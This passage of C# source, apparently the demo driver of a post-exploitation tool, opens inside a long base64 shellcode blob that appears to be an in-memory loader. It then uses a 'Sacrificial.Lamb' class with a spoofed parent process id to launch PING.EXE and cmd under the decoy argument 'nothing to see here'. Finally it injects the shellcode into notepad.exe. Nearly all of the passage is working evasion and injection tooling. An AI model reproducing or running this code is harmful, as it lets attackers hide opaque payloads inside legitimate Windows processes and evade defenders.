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");

            var lamb = new Sacrificial.Lamb(ppid);
            var runResult = lamb.Run(@"C:\Windows\System32\PING.EXE", "nothing to see here", "-n 5 127.0.0.1");
            Console.WriteLine(runResult);
            Console.WriteLine("--\n");
            
            lamb = new Sacrificial.Lamb(ppid);
            var shellResult = lamb.Shell("there's nothing to see here", "/c ping -n 5 127.0.0.1");
            Console.WriteLine(shellResult);
            Console.WriteLine("--\n");

            lamb = new Sacrificial.Lamb(ppid);
            var injectionResult = lamb.Inject(@"C:\Windows\System32\notepad.exe", "nothing to see here", shellcode);
            Console.WriteLine(injectionResult);
        }
    }   
}